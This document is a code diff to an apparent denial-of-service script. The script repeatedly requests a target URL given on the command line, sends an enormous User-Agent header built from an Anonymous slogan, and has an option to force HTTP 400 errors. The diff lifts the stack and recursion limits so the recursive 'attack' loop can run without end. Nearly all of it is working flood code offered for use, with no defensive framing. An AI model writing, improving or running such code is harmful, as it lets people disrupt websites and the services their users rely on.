@@ -25,7 +25,10 @@
 ############################################################################################################################
 # imports
 ############################################################################################################################
+
+import resource
 import sys
+import gc
 import urllib.request
 from bs4 import BeautifulSoup
 from urllib.request import Request
@@ -33,10 +36,17 @@ from urllib.request import Request
 ############################################################################################################################
 # Pass URL and keep requesting it
 ############################################################################################################################
+
+resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
+sys.setrecursionlimit(1000000000)
+gc.enable()
+
 print(str(sys.argv))
+
 URL = str(sys.argv[1])
 UAStr = 'We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us.'
 useBadRequest = str(sys.argv[2]) if len(sys.argv) > 2 else 'false'
+
 if useBadRequest == 'true':
 	# Bad Request : Below loop is for HTTP Code 400
 	for _ in list(range(13)):
@@ -45,16 +55,26 @@ else:
 	# Good Request : Below loop is for HTTP Code 200
 	for _ in list(range(6)):
 		UAStr += UAStr
+
 counter = 0
+counterForUAGeneration = 0
 print('\n____________________________________________________\n\n', 'Attacking ->', URL, '\n____________________________________________________\n')
-def attack(counter):
+
+def attack(counter, counterForUAGeneration):
+
+	gc.collect()
+	
+	counter += 1
+	counterForUAGeneration = (counterForUAGeneration + 1) if counterForUAGeneration < 1000 else (counterForUAGeneration - 1000)
+	headers = {'User-Agent': UAStr + str(counterForUAGeneration)}
+
 	try:
-		counter += 1
-		req = Request(URL, headers={'User-Agent': UAStr + str(counter)})
+		req = Request(URL, headers = headers)
 		title = BeautifulSoup(urllib.request.urlopen(req).read(), 'html.parser').find('title')
 		print('Attack', counter, '->', title.text, '\n')
-		attack(counter)
 	except Exception as ex:
 		print('Attack', counter, '->', ex, '\n')
-		attack(counter)
-attack(counter)
+
+	attack(counter, counterForUAGeneration)
+
+attack(counter, counterForUAGeneration)
